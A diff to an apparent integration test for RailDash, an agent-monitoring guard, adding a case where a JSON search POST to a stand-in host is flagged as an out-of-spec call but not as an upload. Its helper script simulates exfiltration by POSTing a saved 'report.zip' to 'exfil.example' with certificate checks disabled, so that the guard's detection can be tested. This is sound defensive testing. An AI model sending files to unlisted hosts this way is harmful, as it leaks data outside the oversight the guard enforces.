@@ -133,10 +133,12 @@ def wait_for(what: str, check: Callable[[], Any], timeout: float, every: float =
 
 EXFIL_HOST = "exfil.example"
 SECOND_HOST = "second.example"
-# Run in the agent with `python3 -c AGENT_REQUEST <method> <host>`: one HTTPS
-# request to the agent's own server on 8443 with that Host header; for POST,
-# the `report.zip` step 6b saves, sent as `application/zip`, and for GET no
-# body. A file media type is a real upload (RailDash's body-kind step 1, REST
+SEARCH_HOST = "search.example"
+# Run in the agent with `python3 -c AGENT_REQUEST <method> <host> [json]`:
+# one HTTPS request to the agent's own server on 8443 with that Host header;
+# for POST, the `report.zip` step 6b saves, sent as `application/zip`, or
+# with `json` a search query's few parameters as `application/json`; for GET
+# no body. A file media type is a real upload (RailDash's body-kind step 1, REST
 # uploads design in railxia/docs `design/2026-10-30-rest-uploads`), not a few
 # parameters, so the POST is an `uploads` row whether or not RailDash reads
 # body kinds. The collector doesn't capture this client
@@ -148,12 +150,17 @@ SECOND_HOST = "second.example"
 AGENT_REQUEST = """
 import http.client, ssl, sys
 method, host = sys.argv[1], sys.argv[2]
+query = sys.argv[3:] == ["json"]
 conn = http.client.HTTPSConnection("127.0.0.1", 8443, context=ssl._create_unverified_context(), timeout=10)
-body = b"report\\n" if method == "POST" else None
 headers = {"Host": host}
-if body:
+body = None
+if method == "POST" and query:
+    body = b'{"q": "invoices 2026", "limit": 20}'
+    headers["Content-Type"] = "application/json"
+elif method == "POST":
+    body = b"report\\n"
     headers["Content-Type"] = "application/zip"
-conn.request(method, "/upload", body=body, headers=headers)
+conn.request(method, "/search" if query else "/upload", body=body, headers=headers)
 print(method, host, conn.getresponse().status)
 """
 
@@ -528,8 +535,8 @@ def main() -> int:
     saved = {("saved_files", "/data/report.zip")}
     guard.wait_for_rows("(b) writing /data/report.zip is a saved_files violation", saved, exact=True)
 
-    send = lambda method, host: subprocess.run(  # noqa: E731
-        [*agent, "python3", "-c", AGENT_REQUEST, method, host], check=True)
+    send = lambda method, host, *kind: subprocess.run(  # noqa: E731
+        [*agent, "python3", "-c", AGENT_REQUEST, method, host, *kind], check=True)
     send("POST", EXFIL_HOST)
     exfil = saved | {("uploads", EXFIL_HOST), ("out_of_spec_calls", EXFIL_HOST)}
     guard.wait_for_rows("(c) a file POSTed to an unlisted host is an uploads and an "
@@ -548,6 +555,16 @@ def main() -> int:
                         "out_of_spec_calls violation", final, exact=True)
     if guard.row("uploads", SECOND_HOST) is not None:
         sys.exit(f"FAIL: a GET without a body to {SECOND_HOST} was judged an upload")
+    print("ok:   ... and not an upload")
+    # (f) REST uploads M4: a POST whose body is a search query's few
+    # parameters is a call, not an upload (RailDash's body kinds, on by
+    # default; railxia/docs `design/2026-10-30-rest-uploads`).
+    send("POST", SEARCH_HOST, "json")
+    final = final | {("out_of_spec_calls", SEARCH_HOST)}
+    guard.wait_for_rows("(f) a JSON POST of a few parameters to a third unlisted host is "
+                        "an out_of_spec_calls violation", final, exact=True)
+    if guard.row("uploads", SEARCH_HOST) is not None:
+        sys.exit(f"FAIL: a parameters POST to {SEARCH_HOST} was judged an upload")
     print("ok:   ... and not an upload")
     # DR-237: the demo client opens the MCP server's GET stream and ends its
     # session with a DELETE every cycle. Seen here, so the exact rows below,
